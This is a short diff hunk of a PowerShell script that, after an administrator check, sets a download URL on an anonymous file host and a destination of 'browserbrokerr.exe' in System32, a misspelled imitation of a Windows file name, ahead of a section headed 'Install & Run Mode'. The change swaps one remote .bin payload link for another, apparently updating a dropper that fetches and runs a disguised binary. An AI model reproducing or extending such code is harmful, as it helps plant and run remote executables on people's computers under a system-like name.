@@ -29,7 +29,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "browserbrokerr.exe"
-$exeUrl = "https://files.catbox.moe/xl7qgm.bin"
+$exeUrl = "https://files.catbox.moe/oelua5.bin"
 
 # -----------------------------
 # Install & Run Mode
